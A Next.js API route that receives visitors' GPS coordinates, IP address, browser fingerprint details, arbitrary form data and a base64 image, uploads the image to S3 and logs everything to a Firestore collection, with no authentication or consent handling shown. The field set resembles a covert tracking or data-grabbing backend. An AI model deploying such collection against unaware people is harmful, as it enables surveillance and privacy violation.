import { NextRequest, NextResponse } from 'next/server'
import { adminDb } from '@/lib/firebase/firebase-admin'
import { uploadImageToS3 } from '@/lib/s3-client'

interface LocationData {
  latitude?: number
  longitude?: number
  accuracy?: number
  ipAddress?: string
  userAgent?: string
  screenResolution?: string
  timezone?: string
  language?: string
  formData?: Record<string, any>
  imageBase64?: string
}

function getIpAddress(request: NextRequest): string {
  const forwarded = request.headers.get('x-forwarded-for')
  const realIp = request.headers.get('x-real-ip')
  const cfConnectingIp = request.headers.get('cf-connecting-ip')
  
  if (cfConnectingIp) return cfConnectingIp
  if (realIp) return realIp
  if (forwarded) return forwarded.split(',')[0].trim()
  
  return 'unknown'
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    const locationData: LocationData = body

    console.log('Device location data received')

    // Get client IP address from headers
    const ipAddress = getIpAddress(request)
    const userAgent = request.headers.get('user-agent') || 'unknown'

    // Upload image to S3 if present
    let imageUrl: string | null = null
    if (locationData.imageBase64) {
      console.log('Uploading image to S3...')
      const uploadResult = await uploadImageToS3(locationData.imageBase64)
      if (uploadResult.success && uploadResult.url) {
        imageUrl = uploadResult.url
        console.log('Image uploaded successfully:', imageUrl)
      } else {
        console.error('Failed to upload image to S3:', uploadResult.error)
      }
    }

    // Prepare data for storage
    const dataToStore = {
      timestamp: new Date(),
      createdAt: new Date().toISOString(),
      latitude: locationData.latitude || null,
      longitude: locationData.longitude || null,
      accuracy: locationData.accuracy || null,
      ipAddress: locationData.ipAddress || ipAddress,
      userAgent: locationData.userAgent || userAgent,
      screenResolution: locationData.screenResolution || null,
      timezone: locationData.timezone || null,
      language: locationData.language || null,
      formData: locationData.formData || null,
      imageUrl: imageUrl, // Store S3 URL instead of hasImage flag
    }

    // Store in Firestore
    try {
      await adminDb.collection('device_locations').add(dataToStore)
      console.log('Device location saved to Firestore successfully')
    } catch (firestoreError) {
      console.error('Error saving to Firestore:', firestoreError)
    }

    // Return success response
    return NextResponse.json(
      { 
        success: true, 
        message: 'Location data received',
        imageUrl: imageUrl 
      },
      { status: 200 }
    )

  } catch (error) {
    console.error('Error processing location data:', error)
    return NextResponse.json(
      { success: false, error: 'Failed to process location data' },
      { status: 500 }
    )
  }
}
